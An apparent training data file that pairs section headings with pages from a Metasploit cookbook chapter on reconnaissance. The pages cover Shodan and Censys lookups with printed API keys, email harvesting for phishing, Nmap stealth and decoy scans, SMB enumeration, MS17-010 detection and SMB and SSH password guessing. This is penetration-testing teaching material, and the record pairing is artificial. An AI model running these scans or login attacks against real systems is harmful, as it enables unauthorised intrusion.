    "output": "Information Gathering and Scanning Chapter 2\nmsf auxiliary(censys_search) > run\n...\n[+] 138.68.148.235 - 443/https,22/ssh,80/http\n[+] 83.166.169.235 - 80/http\n[+] 83.166.169.228 - 80/http\n[+] 151.248.166.228 - 443/https,80/http\n[+] 151.248.166.228 - 443/https,80/http\n[*] Auxiliary module execution completed\nmsf auxiliary(censys_search) >\nShodan Search\nShodan is a paid search engine for internet-connected devices. Shodan lets you search for\nbanners, grabs metadata about the device, such as its geographic location, hostname,\noperating system, and more.\nTo use the Shodan Search auxiliary module, you first need to create an\naccount on the https:/​/​www.​shodan.​io website to get your API Key.\nmsf > use auxiliary/gather/shodan_search\nmsf auxiliary(shodan_search) > set QUERY hostname:packtpub.com\nQUERY => hostname:packtpub.com\nmsf auxiliary(shodan_search) > set SHODAN_APIKEY\n1dOobpT1S1337sq6yx0gEKblap6yC2ib\nSHODAN_APIKEY => 1dOobpT1S1337sq6yx0gEKblap6yC2ib\nmsf auxiliary(shodan_search) > run\n...\nSearch Results\n==============\nIP:Port City Country Hostname\n------- ---- ------- --------\n109.234.207.107:25 Wolverhampton United Kingdom imap.packtpub.com\n109.234.207.107:443 Wolverhampton United Kingdom imap.packtpub.com\n109.234.207.107:587 Wolverhampton United Kingdom imap.packtpub.com\n109.234.207.107:80 Wolverhampton United Kingdom imap.packtpub.com\n109.234.207.107:993 Wolverhampton United Kingdom imap.packtpub.com\n83.166.169.228:80 Loughborough United Kingdom packtpub.com\n83.166.169.248:111 Loughborough United Kingdom imap.packtpub.com\n83.166.169.248:161 Loughborough United Kingdom imap.packtpub.com\n83.166.169.248:443 Loughborough United Kingdom imap.packtpub.com\n83.166.169.248:80 Loughborough United Kingdom imap.packtpub.com\n[ 45 ]"
  },
  {
    "input": "Search Engine Domain Email Address Collector",
    "output": "Information Gathering and Scanning Chapter 2\n83.166.169.248:8080 Loughborough United Kingdom imap.packtpub.com\n[*] Auxiliary module execution completed\nmsf auxiliary(shodan_search) >\nThe Shodan Search auxiliary module has revealed further information about the target,\nsuch as its IP address, open ports, location, and so on. These passive techniques can reveal\nsome interesting information about the target and can ease our way for penetration testing.\nShodan Honeyscore Client\nChecking whether a server is a honeypot or not is always a good idea. The last thing you\nwant is to waste your time or be blocked because you were trying to attack a honeypot.\nUsing the Shodan Honeyscore Client auxiliary module, you can use Shodan to check\nwhether a server is a honeypot or not. The API returns a score from 0.0 to 1.0, 1.0 being a\nhoneypot:\nmsf > use auxiliary/gather/shodan_honeyscore\nmsf auxiliary(shodan_honeyscore) > set SHODAN_APIKEY\n1dOobpT0SCLAQsq6yxogEKKh1p6yC2ib\nSHODAN_APIKEY => 1dOobpT0SCLAQsq6yxogEKKh1p6yC2ib\nmsf auxiliary(shodan_honeyscore) > set TARGET 83.166.169.248\nTARGET => 83.166.169.248\nmsf auxiliary(shodan_honeyscore) > run\n[*] Scanning 83.166.169.248\n[-] 83.166.169.248 is not a honeypot\n[*] 83.166.169.248 honeyscore: 0.0/1.0\n[*] Auxiliary module execution completed\nmsf auxiliary(shodan_honeyscore) >\nSearch Engine Domain Email Address Collector\nCollecting email addresses is a common part of a penetration test, allows us to understand\nthe customer footprint on the internet, harvester credentials for future brute-force attacks,\nand phishing campaigns.\n[ 46 ]"
  },
  {
    "input": "How to do it...",
    "output": "Information Gathering and Scanning Chapter 2\nTo create a list of valid email addresses for the target domain, we can use the Search Engine\nDomain Email Address Collector auxiliary module:\nmsf > auxiliary/gather/search_email_collector\nmsf auxiliary(search_email_collector) > set DOMAIN packtpub.com\nmsf auxiliary(search_email_collector) > set DOMAIN packtpub.com\nDOMAIN => packtpub.com\nmsf auxiliary(search_email_collector) > run\n[*] Harvesting emails .....\n[*] Searching Google for email addresses from packtpub.com\n[*] Extracting emails from Google search results...\n[*] Searching Bing email addresses from packtpub.com\n...\n[*] Auxiliary module execution completed\nmsf auxiliary(search_email_collector) >\nLooking at the output, you can see that the module uses Google, Bing, and Yahoo to search\nfor valid email addresses for the target domain, and was able to locate 20 email addresses\nfor packtpub.com.\nActive information gathering with Metasploit\nScanning is an active information gathering technique in which we will now start dealing\nwith the target directly. Port scanning is an interesting process of information gathering. It\ninvolves a deeper search of the target machine, but since active port scanning involves\nreaching out to the target systems, these activities can be detected by firewalls and intrusion\nprevention systems.\nHow to do it...\nThere are a variety of port scanners available to us within the Metasploit Framework,\nallowing us to properly enumerate the target systems. To list all the available portscan\nmodules, you can use the search command, as follows:\n[ 47 ]"
  },
  {
    "input": "TCP Port Scanner",
    "output": "Information Gathering and Scanning Chapter 2\nTCP Port Scanner\nWe can start by doing a basic TCP portscan with the TCP Port Scanner auxiliary\nmodule and see what we can find.\nSince the TCP Port Scanner auxiliary module does not need administrative\nprivileges on the source machine, it can be extremely useful when\npivoting.\nTo run the TCP Port Scanner auxiliary module, we need to set the RHOSTS to the target\nrange of our lab 192.168.216.0/24 and set the number of concurrent threads to 100\nto speed up the scan:\nScanners and most other auxiliary modules use the RHOSTS option instead\nof RHOST.\nmsf > use auxiliary/scanner/portscan/\nmsf auxiliary(tcp) > set RHOSTS 192.168.216.0/24\nRHOSTS => 192.168.216.0/24\nmsf auxiliary(tcp) > set THREADS 100\nTHREADS => 100\nmsf auxiliary(tcp) > run\n[+] 192.168.216.5: - 192.168.216.5:22 - TCP OPEN\n[ 48 ]"
  },
  {
    "input": "TCP SYN Port Scanner",
    "output": "Information Gathering and Scanning Chapter 2\n[+] 192.168.216.10: - 192.168.216.10:22 - TCP OPEN\n[+] 192.168.216.10: - 192.168.216.10:139 - TCP OPEN\n[+] 192.168.216.10: - 192.168.216.10:135 - TCP OPEN\n...\n[+] 192.168.216.10: - 192.168.216.10:9300 - TCP OPEN\n[*] Scanned 256 of 256 hosts (100% complete)\n[*] Auxiliary module execution completed\nWhen using Metasploit modules, you can check the available options for that specific\nmodule using the show options command and use the show missing command to show\nthe missing values required by the module:\nmsf auxiliary(tcp) > show missing\nModule options (auxiliary/scanner/portscan/tcp):\nName Current Setting Required Description\n---- --------------- -------- -----------\nRHOSTS yes The target address range or CIDR\nidentifier\nTCP SYN Port Scanner\nThe TCP SYN Port Scanner auxiliary module scans TCP services using a raw SYN scan, thus\nreducing the number of packets, as it never completes the three-way handshake. To run\nthe TCP SYN Port Scanner auxiliary module, we will specify the interface, set the port range\nto the first 1000 ports, set the RHOSTS to the target range of our lab 192.168.216.0/24,\nand set the number of concurrent threads to 256 to speed up the scan:\nmsf > use auxiliary/scanner/portscan/syn\nmsf auxiliary(syn) > set INTERFACE eth0\nINTERFACE => eth0\nmsf auxiliary(syn) > set PORTS 1-1000\nPORTS => 1-1000\nmsf auxiliary(syn) > set THREADS 256\nTHREADS => 256\nmsf auxiliary(syn) > run\n[+] TCP OPEN 192.168.216.10:22\n[+] TCP OPEN 192.168.216.10:135\n[+] TCP OPEN 192.168.216.10:139\n[+] TCP OPEN 192.168.216.10:445\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n[ 49 ]"
  },
  {
    "input": "How to do it...",
    "output": "Information Gathering and Scanning Chapter 2\nmsf auxiliary(syn) >\nOn a Unix-like operating system, the number of concurrent threads can be\nset as high as 256.\nPort scanning—the Nmap way\nNmap is the most powerful and preferred scanner for security professionals. The usage of\nNmap varies from novice to an advanced level; we will analyze the various scan techniques\nin detail.\nGetting ready\nYou run Nmap directly from msfconsole, as you normally would from the command line.\nHowever, if you want to import the results into the Metasploit database, you need to run\nthe Nmap scan using the -oX flag, followed by the desired filename to generate the XML\noutput file, and then issue the db_import command to populate the Metasploit database.\nHow to do it...\nStarting Nmap from Metasploit is easy:\n1. Launch msfconsole and type in nmap to display the list of scan options that\nNmap provides:\nmsf > nmap\n2. The TCP connect [-sT] scan is the most basic and default scan type in Nmap.\nIt follows the three-way handshake process to detect the open ports on the target\nmachine. Let's perform this scan on one of our targets:\nmsf > nmap -sT 192.168.216.10\n[*] exec: nmap -sT 192.168.216.10\nStarting Nmap 7.60 ( https://nmap.org ) at 2017-10-19 08:53 EDT\nNmap scan report for 192.168.216.10\nHost is up (0.49s latency).\nNot shown: 976 closed ports\n[ 50 ]\nInformation Gathering and Scanning Chapter 2\nPORT STATE SERVICE\n22/tcp open ssh\n135/tcp open msrpc\n139/tcp open netbios-ssn\n....\n49158/tcp open unknown\n49159/tcp open unknown\nMAC Address: 00:0C:29:38:B3:A9 (VMware)\nNmap done: 1 IP address (1 host up) scanned in 3.25 seconds\nAs we can see, we have passed the -sT parameter, which denotes that we want to\nperform a TCP connect scan. A TCP connect scan is based on a three-way\nhandshake process, hence, the returned results of this scan are considered\naccurate.\nWhen using Nmap without specifying the port range, Nmap scans the\nmost common 1,000 ports for each protocol.\n3. The SYN scan [-sS] is considered a stealth scanning technique, as it never\nforms a complete connection between the target and the scanner. Hence, it is also\ncalled half-open scanning. Let's analyze a SYN scan on the target:\nmsf > nmap -sS 192.168.216.10 -p 22-5000\n[*] exec: nmap -sS 192.168.216.10 -p 22-5000\nStarting Nmap 7.60 ( https://nmap.org ) at 2017-10-19 09:00 EDT\nNmap scan report for 192.168.216.10\nHost is up (0.00063s latency).\nNot shown: 4967 closed ports\nPORT STATE SERVICE\n22/tcp open ssh\n135/tcp open msrpc\n...\n3920/tcp open exasoftport1\n4848/tcp open appserv-http\nMAC Address: 00:0C:29:38:B3:A9 (VMware)\nNmap done: 1 IP address (1 host up) scanned in 685.27 seconds\nmsf >\n[ 51 ]"
  },
  {
    "input": "How it works...",
    "output": "Information Gathering and Scanning Chapter 2\nThe –sS parameter will instruct Nmap to perform a SYN scan on the target\nmachine. The output of both TCP connect and the SYN scan are similar in most of\nthe cases, but the only difference lies in the fact that SYN scans are difficult to\ndetect by firewalls and Intrusion Detection Systems (IDS). However, modern\nfirewalls are capable enough to catch SYN scans, as well. The –p parameter shows\nthe range of port numbers that we want to scan. Using -p 0-65535, or -p - for\nshort, will scan all the available ports.\n4. The UDP scan [-sU] is the scanning technique to identify open UDP ports on the\ntarget. 0-byte UDP packets are sent to the target machine and the recipient of an\nICMP port unreachable message shows that the port is closed; otherwise, it is\nconsidered open. It can be used in the following manner:\nmsf > nmap -sU 192.168.216.10\n[*] exec: nmap -sU 192.168.216.10\nStarting Nmap 7.60 ( https://nmap.org ) at 2017-10-19 09:09 EDT\nNmap scan report for 192.168.216.10\nHost is up (0.00064s latency).\nNot shown: 994 closed ports\nPORT STATE SERVICE\n137/udp open netbios-ns\n138/udp open|filtered netbios-dgm\n500/udp open|filtered isakmp\n4500/udp open|filtered nat-t-ike\n5353/udp open|filtered zeroconf\n5355/udp open|filtered llmnr\nMAC Address: 00:0C:29:38:B3:A9 (VMware)\nNmap done: 1 IP address (1 host up) scanned in 319.56 seconds\nmsf >\nThe previous command will check whether the most common 1,000 ports for the\nUDP protocol on 192.168.56.102 are open or not.\nHow it works...\nWe have analyzed three different types of Nmap scans that can be very helpful during\npenetration testing. Nmap provides lots of different modes for scanning the target machine.\nHere, we will focus on three scan types, namely, the TCP connect scan, the SYN stealth\nscan, and the UDP scan. The different scan options of Nmap can also be combined in a\nsingle scan in order to perform a more advanced and sophisticated scan over the target.\nLet's move ahead and start the scanning process.\n[ 52 ]"
  },
  {
    "input": "Operating system and version detection",
    "output": "Information Gathering and Scanning Chapter 2\nDuring a penetration test, the scanning process can provide lots of useful results. Since the\ninformation collected here will form the basis of penetration testing, proper knowledge of\nscan types is highly recommended. Let's now take a deeper look into each of these scan\ntechniques we just learned.\nThe TCP connect scan is the most basic scanning technique in which a full connection is\nestablished with the port under test. It uses the operating system's network functions to\nestablish connections. The scanner sends a SYN packet to the target machine. If the port is\nopen, it returns an ACK message back to the scanner. The scanner then sends an ACK\npacket back to the target showing the successful establishment of a connection. This is\ncalled a three-way handshake process. The connection is terminated as soon as it is opened.\nThis technique has its benefits, but it is easily traceable by firewalls and IDS.\nA SYN scan is another type of TCP scan, but it never forms a complete connection with the\ntarget. It doesn't use the operating system's network functions; instead, it generates raw IP\npackets and monitors for responses. If the port is open, then the target will respond with an\nACK message. The scanner then sends a reset connection (RST) message and ends the\nconnection. Hence, it is also called half-open scanning. This is considered as a stealth\nscanning technique as it can avoid raising a flag in some misconfigured firewalls and IDS.\nUDP scanning is a connectionless scanning technique; hence, no notification is sent back to\nthe scanner, whether the packet has been received by the target or not. If the port is closed,\nthen an ICMP port unreachable message is sent back to the scanner. If no message is\nreceived, then the port is reported as open. This method can return false results as firewalls\ncan block the data packets and, therefore, no response message will be generated and the\nscanner will report the port as open.\nThere's more...\nLet's look further into the Nmap scans and see how we can club different scan types into\none.\nOperating system and version detection\nThere are some advanced options provided by Nmap, apart from port scanning. These\noptions can help us gain more information about our target. One of the most widely used\noptions is operating system identification [-O]. This can help us in identifying the\noperating system running on the target machine.\n[ 53 ]\nInformation Gathering and Scanning Chapter 2\nAn operating system detection scan output is shown as follows:\nmsf > nmap -O 192.168.216.129\n[*] exec: nmap -O 192.168.216.129\n​\nStarting Nmap 7.60 ( https://nmap.org ) at 2017-10-19 09:28 EDT\nNmap scan report for 192.168.216.129\nHost is up (0.0012s latency).\nNot shown: 977 closed ports\nPORT STATE SERVICE\n21/tcp open ftp\n22/tcp open ssh\n23/tcp open telnet\n...\nRunning: Linux 2.6.X\nOS CPE: cpe:/o:linux:linux_kernel:2.6\nOS details: Linux 2.6.9 - 2.6.33\nNetwork Distance: 1 hop\n​\nOS detection performed. Please report any incorrect results at\nhttps://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 3.91 seconds\nmsf >\nAs we can see, Nmap has successfully detected the operating system of the target machine.\nThis can ease our task of finding the right exploits, in accordance with the operating system\nof the target.\nThe other widely used Nmap option is version detection [-sV] of different open ports on\nthe target. It can be mixed with any of the scan types that we saw previously, to add an\nextra bit of information of what version of services are running on the open ports of the\ntarget:\nmsf > nmap -sV 192.168.216.129\n[*] exec: nmap -sV 192.168.216.129\n​\nStarting Nmap 7.60 ( https://nmap.org ) at 2017-10-19 09:30 EDT\nNmap scan report for 192.168.216.129\nHost is up (0.00049s latency).\nNot shown: 977 closed ports\nPORT STATE SERVICE VERSION\n...\nirc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n​\nService detection performed. Please report any incorrect results at\n[ 54 ]"
  },
  {
    "input": "Getting ready",
    "output": "Information Gathering and Scanning Chapter 2\nhttps://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 13.57 seconds\nmsf >\nAs we can see, an extra column of versions has been added in our scan output, which\nreports about the different versions of services running on the target machine.\nIncreasing anonymity\nSometimes it is essential to perform scans in an anonymous manner. The firewall and IDS\nlogs can reveal your IP address if you perform a scan without using security measures. One\nsuch feature is provided in Nmap, called decoy (-D).\nThe decoy option does not prevent your IP address from getting recorded in the log file of\nfirewalls and IDS, but it does make the scan look scary. It adds other torrents in the log files,\nthus creating an impression that there are several other attackers scanning the machine\nsimultaneously. So, if you add two decoy IP addresses, the log file will show that the\nrequest packets were sent from three different IP addresses; one will be yours and the other\ntwo will be the fake addresses added by you:\nmsf > nmap -sT 192.168.216.10 -D 192.168.216.13,192.168.216.25\nThis scan example shows the use of a -D parameter. The IP addresses after the -D operator\nare the fake IP addresses, which will also appear in the network log files of the target\nmachine, along with the original IP address. This process can confuse the network\nadministrators and create suspicion in their mind that all three IP addresses are fake or\nspoofed. But adding too many decoy addresses can affect the scan results; hence, you\nshould use a limited number of decoy addresses only.\nPort scanning—the db_nmap way\nUsing the db_nmap command, we can run Nmap against our targets and store our scan\nresults automatically in our database, without the need to use the db_import command.\nGetting ready\nThe db_nmap command is part of msfconsole, so you just need to launch msfconsole and\nuse db_nmap, as you would use nmap on the command line.\n[ 55 ]"
  },
  {
    "input": "Nmap Scripting Engine",
    "output": "Information Gathering and Scanning Chapter 2\nHow to do it...\nIn Chapter 1, Metasploit Quick Tips for Security Professionals, we already talked about the\ndb_nmap basic usage, so now we will take a look at some more advanced features. In the\nfollowing example, you will learn how to use some of those features:\nmsf > db_nmap -Pn -sTV -T4 --open --min-parallelism 64 --version-all\n192.168.216.10 -p -\n[*] Nmap: Starting Nmap 7.60 ( https://nmap.org ) at 2017-10-20 06:33 EDT\n[*] Nmap: Nmap scan report for 192.168.216.10\n[*] Nmap: Host is up (0.00044s latency).\n[*] Nmap: Not shown: 54809 closed ports, 10678 filtered ports\n[*] Nmap: Some closed ports may be reported as filtered due to --defeat-\nrst-ratelimit\n...\n[*] Nmap: 50560/tcp open unknown\n[*] Nmap: 50561/tcp open unknown\n[*] Nmap: Service Info: OSs: Windows, Windows Server 2008 R2 - 2012;\nDevice: remote management; CPE: cpe:/o:microsoft:windows\n[*] Nmap: Service detection performed. Please report any incorrect results\nat https://nmap.org/submit/ .\n[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 522.38 seconds\nmsf >\nWe use db_nmap with the -Pn option to treat all hosts as online and skip host discovery, -\nsTV to perform a TCP connect scan, the V flag to carry out a version scan of the open ports\ndiscovered, and -T4 to set the timing template higher so the scan runs faster. The --\nopen option will only show open ports, --min-parallelism is used to specify\nthe minimum amount of parallel processes at one time, and --version-all to try every\nsingle probe in order to identify a more specific version of the service running on an open\nport. To run the scan, we set the IP address of the target host and use -p - to specify that\nwe want to scan all the 65535 ports.\nNmap Scripting Engine\nThe Nmap Scripting Engine (NSE) is one of Nmap's most powerful and flexible features,\neffectively turning Nmap into a vulnerability scanner. The NSE has almost 600 scripts,\ndivided into categories and ranging from safer discovery scripts to more intrusive scripts\nsuch as brute force, exploitation, and denial of service. You can find the NSE scripts in the\n/usr/share/nmap/scripts directory in Kali Linux, or simply by searching for the\nwildcard *.nse with the locate command.\n[ 56 ]"
  },
  {
    "input": "Getting ready",
    "output": "Information Gathering and Scanning Chapter 2\nThe basic syntax for running the NSE scripts is as follows:\nnmap --script <scriptname> <host ip>\nThe same applies to the db_nmap command, so let's use the NSE to try to find some\nHTTP/HTTPS vulnerabilities:\nmsf > db_nmap --open -sTV -Pn -p 80,443,8000,8080,8585 --script=http-\nvhosts,http-userdir-enum,http-apache-negotiation,http-backup-finder,http-\nconfig-backup,http-default-accounts,http-methods,http-method-tamper,http-\npasswd,http-robots.txt,ssl-poodle,ssl-heartbleed,http-webdav-scan,http-iis-\nwebdav-vuln 192.168.216.10\n[*] Nmap: Starting Nmap 7.60 ( https://nmap.org ) at 2017-10-20 10:26 EDT\n[*] Nmap: Nmap scan report for 192.168.216.10\n[*] Nmap: Host is up (0.00068s latency).\n[*] Nmap: Not shown: 3 closed ports\n[*] Nmap: PORT STATE SERVICE VERSION\n[*] Nmap: 8080/tcp open http Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3;\nJava 1.8)\n[*] Nmap: | http-backup-finder:\n...\n[*] Nmap: |_127 names had status 200\n[*] Nmap: Service detection performed. Please report any incorrect results\nat https://nmap.org/submit/ .\n[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 293.24 seconds\nmsf >\nLooking at the output, we can see some potentially risky HTTP methods, such as PUT,\nDELETE, and TRACE.\nHost discovery with ARP Sweep\nARP Sweep allows us to enumerate live hosts in the local network using ARP requests,\nproviding us with a simple and fast way to identify possible targets.\nGetting ready\nWhen your target systems are located on the same LAN as your attacking machine, you are\nable to enumerate systems by performing an ARP scan.\n[ 57 ]"
  },
  {
    "input": "How to do it...",
    "output": "Information Gathering and Scanning Chapter 2\nHow to do it...\n1. To enumerate systems using ARP in Metasploit, you can use the ARP Sweep\nLocal Network Discovery auxiliary module. You just need to set the target\naddress range in RHOSTS, set the number of concurrent threads, and run the\nmodule:\nmsf > use auxiliary/scanner/discovery/arp_sweep\nmsf auxiliary(arp_sweep) > set RHOSTS 192.168.216.0/24\nRHOSTS => 192.168.216.0/24\nmsf auxiliary(arp_sweep) > set THREADS 256\nTHREADS => 256\nmsf auxiliary(arp_sweep) > run\n[+] 192.168.216.1 appears to be up (VMware, Inc.).\n[+] 192.168.216.2 appears to be up (VMware, Inc.).\n[+] 192.168.216.10 appears to be up (VMware, Inc.).\n[+] 192.168.216.129 appears to be up (VMware, Inc.).\n[+] 192.168.216.254 appears to be up (VMware, Inc.).\n[*] Scanned 256 of 256 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(arp_sweep) >\n2. If enabled, the results will be stored in the Metasploit database. To display the\nhosts discovered, you can use the hosts command:\nmsf auxiliary(arp_sweep) > hosts\nHosts\n=====\naddress mac name os_name os_flavor os_sp\npurpose info comments\n------- --- ---- ------- --------- ----- ----\n--- ---- --------\n192.168.216.1 00:50:56:c0:00:08\n192.168.216.2 00:50:56:e3:fd:60\n192.168.216.10 00:0c:29:38:b3:a9\n192.168.216.129 00:0c:29:79:a6:61\n192.168.216.254 00:50:56:fe:6a:62\nmsf auxiliary(arp_sweep) >\n[ 58 ]"
  },
  {
    "input": "How to do it...",
    "output": "Information Gathering and Scanning Chapter 2\nUDP Service Sweeper\nThe UDP Service Sweeper auxiliary module allows us to detect interesting UDP services.\nSince UDP is a connectionless protocol, it is more difficult to probe than TCP. Using an\nauxiliary module like the UDP Service Sweeper can help you find some low-hanging fruit,\nin a timely manner.\nHow to do it...\nTo run the UDP Service Sweeper, select\nthe auxiliary/scanner/discovery/udp_sweep module and set the target address\nrange in RHOSTS:\nmsf > use auxiliary/scanner/discovery/udp_sweep\nmsf auxiliary(udp_sweep) > set RHOSTS 192.168.216.0/24\nRHOSTS => 192.168.216.0/24\nmsf auxiliary(udp_sweep) > run\n[*] Sending 13 probes to 192.168.216.0->192.168.216.255 (256 hosts)\n[*] Discovered NetBIOS on 192.168.216.1:137 (MACBOOK-PRO:<00>:U\n:00:50:56:c0:00:08)\n...\n[*] Discovered Portmap on 192.168.216.129:111 (100000 v2 TCP(111), 100000\nv2 UDP(111), 100024 v1 UDP(52986), 100024 v1 TCP(53621), 100003 v2\nUDP(2049), 100003 v3 UDP(2049), 100003 v4 UDP(2049), 100021 v1 UDP(49681),\n100021 v3 UDP(49681), 100021 v4 UDP(49681), 100003 v2 TCP(2049), 100003 v3\nTCP(2049), 100003 v4 TCP(2049), 100021 v1 TCP(60203), 100021 v3 TCP(60203),\n100021 v4 TCP(60203), 100005 v1 UDP(48062), 100005 v1 TCP(34047), 100005 v2\nUDP(48062), 100005 v2 TCP(34047), 100005 v3 UDP(48062), 100005 v3\nTCP(34047))\n[*] Discovered DNS on 192.168.216.129:53 (BIND 9.4.2)\n[*] Scanned 256 of 256 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(udp_sweep) >\nThe UDP Service Sweeper module was able to discover that our target is running a BIND\nDNS on port 54.\n[ 59 ]"
  },
  {
    "input": "How to do it...",
    "output": "Information Gathering and Scanning Chapter 2\nSMB scanning and enumeration\nOver the years, the Server Message Block (SMB) protocol, a network file sharing protocol\nimplemented in Microsoft Windows, has proven to be one of the most abused protocols,\nallowing from sharing and user enumeration up to remote code execution.\nHow to do it...\n1. Using the SMB Share Enumeration auxiliary module without authentication,\nallows us to collect some valuable information, such as share names and OS\nversions and services packs:\nmsf > use auxiliary/scanner/smb/smb_enumshares\nmsf auxiliary(smb_enumshares) > set RHOSTS 192.168.216.10,129\nRHOSTS => 192.168.216.10,129\nmsf auxiliary(smb_enumshares) > run\n...\n[+] 192.168.216.129:139 - IPC$ - (I) IPC Service (metasploitable\nserver (Samba 3.0.20-Debian))\n[+] 192.168.216.129:139 - ADMIN$ - (I) IPC Service (metasploitable\nserver (Samba 3.0.20-Debian))\n[*] Scanned 2 of 2 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(smb_enumshares) >\n[ 60 ]\nInformation Gathering and Scanning Chapter 2\n2. The SMB Share Enumeration auxiliary module is also very useful when\nperforming post exploitation. By supplying valid credentials, we can easily\nenumerate share and list files:\nMetasploit has several SMB scanning auxiliary modules. Next we will have a look\nat some of the most useful modules.\n3. The SMB Version Detection auxiliary module displays the SMB version for each\ntarget system:\nmsf > use auxiliary/scanner/smb/smb_version\nmsf auxiliary(smb_version) > set RHOSTS 192.168.216.10\nRHOSTS => 192.168.216.10\nmsf auxiliary(smb_version) > run\n[+] 192.168.216.10:445 - Host is running Windows 2008 R2 Standard\nSP1 (build:7601) (name:VAGRANT-2008R2) (workgroup:WORKGROUP )\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(smb_version) >\n[ 61 ]\nInformation Gathering and Scanning Chapter 2\n4. The SMB User Enumeration auxiliary module allows us to determine what local\nusers exist via the SAM RPC service:\nmsf > use auxiliary/scanner/smb/smb_enumusers\nmsf auxiliary(smb_enumusers) > set SMBPASS vagrant\nSMBPASS => vagrant\nmsf auxiliary(smb_enumusers) > set SMBUSER vagrant\nSMBUSER => vagrant\nmsf auxiliary(smb_enumusers) > set RHOSTS 192.168.216.10\nRHOSTS => 192.168.216.10\nmsf auxiliary(smb_enumusers) > run\n[+] 192.168.216.10:445 - VAGRANT-2008R2 [ Administrator,\nanakin_skywalker, artoo_detoo, ben_kenobi, boba_fett, chewbacca,\nc_three_pio, darth_vader, greedo, Guest, han_solo, jabba_hutt,\njarjar_binks, kylo_ren, lando_calrissian, leia_organa,\nluke_skywalker, sshd, sshd_server, vagrant ] ( LockoutTries=0\nPasswordMin=0 )\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(smb_enumusers) >\n5. The SMB Login Check Scanner auxiliary module will test an SMB login on a\nrange of machines and report successful logins:\nmsf > use auxiliary/scanner/smb/smb_login\nmsf auxiliary(smb_login) > set RHOSTS 192.168.216.10\nRHOSTS => 192.168.216.10\nmsf auxiliary(smb_login) > set SMBUSER vagrant\nSMBUSER => vagrant\nmsf auxiliary(smb_login) > set PASS_FILE /root/password.lst\nPASS_FILE => /root/password.lst\nmsf auxiliary(smb_login) > run\n...\n[*] 192.168.216.10:445 - 192.168.216.10:445 - Domain is ignored for\nuser vagrant\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(smb_login) >\n[ 62 ]"
  },
  {
    "input": "Detecting SSH versions with the SSH Version Scanner",
    "output": "Information Gathering and Scanning Chapter 2\n6. The MS17-010 SMB RCE Detection auxiliary module uses information disclosure\nto determine if MS17-010 has been patched or not. Specifically, it connects to the\nIPC$ tree and attempts a transaction on FID 0. If the status returned\nis STATUS_INSUFF_SERVER_RESOURCES, the machine does not have the\nMS17-010 patch. If the machine is missing the MS17-010 patch, the module will\ncheck for an existing DoublePulsar (ring 0 shellcode/malware) infection. This\nmodule does not require valid SMB credentials in default server configurations. It\ncan log on as the user \\ and connect to IPC$:\nmsf > use auxiliary/scanner/smb/smb_ms17_010\nmsf auxiliary(smb_ms17_010) > set RHOSTS 192.168.216.10\nRHOSTS => 192.168.216.10\nmsf auxiliary(smb_ms17_010) > run\n[+] 192.168.216.10:445 - Host is likely VULNERABLE to MS17-010!\n(Windows Server 2008 R2 Standard 7601 Service Pack 1)\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(smb_ms17_010) >\n7. Metasploit has a plethora of SMB auxiliary modules that you should try. To list\nall the available SMB modules, you can hit Tab button to display all the available\nmodules under auxiliary/scanner/smb/:\nmsf > use auxiliary/scanner/smb/\n...\nuse auxiliary/scanner/smb/smb_ms17_010\nuse auxiliary/scanner/smb/smb_uninit_cred\nuse auxiliary/scanner/smb/smb_version\nmsf > use auxiliary/scanner/smb/\nDetecting SSH versions with the SSH\nVersion Scanner\nSSH is a widely used application that provides a secure remote login. It uses strong\ncryptography to provide authentication and confidentiality. In this recipe, we will be\ndetecting SSH versions currently running on our target. With this SSH Version Scanner, we\ncan determine if the target is equipped with any vulnerable SSH version and, if yes, we can\nmove further.\n[ 63 ]"
  },
  {
    "input": "How to do it...",
    "output": "Information Gathering and Scanning Chapter 2\nGetting ready\nPrevious scans show us that we have TCP port 22 open on the target systems, so we will\nuse the SSH Version Scanner auxiliary module to get information about the SSH version\nrunning on the target system.\nHow to do it...\n1. To scan for SSH servers on the network, use the\nauxiliary/scanner/ssh/ssh_version auxiliary module, set the target\naddress range in RHOSTS, and the number of concurrent threads to 256:\nmsf > use auxiliary/scanner/ssh/ssh_version\nmsf auxiliary(ssh_version) > set RHOSTS 192.168.216.0/24\nRHOSTS => 192.168.216.0/24\nmsf auxiliary(ssh_version) > set THREADS 256\nTHREADS => 256\nmsf auxiliary(ssh_version) > run\n...\n[*] Scanned 133 of 256 hosts (51% complete)\n[*] Scanned 232 of 256 hosts (90% complete)\n[*] Scanned 250 of 256 hosts (97% complete)\n[*] Scanned 255 of 256 hosts (99% complete)\n[*] Scanned 256 of 256 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(ssh_version) >\nSo, in our scan, we found some active SSH versions in the target address range.\nOnce we have discovered the SSH version, we can search for vulnerabilities for\nthat specific version.\n2. To search for default or guessable credentials, you can use the SSH Login Check\nScanner auxiliary module to test SSH logins on a range of machines and report\nsuccessful logins:\nmsf > use auxiliary/scanner/ssh/ssh_login\nmsf auxiliary(ssh_login) > set USERNAME user\nUSERNAME => user\nmsf auxiliary(ssh_login) > set PASS_FILE /root/password.lst\nPASS_FILE => /root/password.lst\nmsf auxiliary(ssh_login) > set RHOSTS 192.168.216.10,129\nRHOSTS => 192.168.216.10,129\n[ 64 ]"
  },
  {
    "input": "Getting ready",
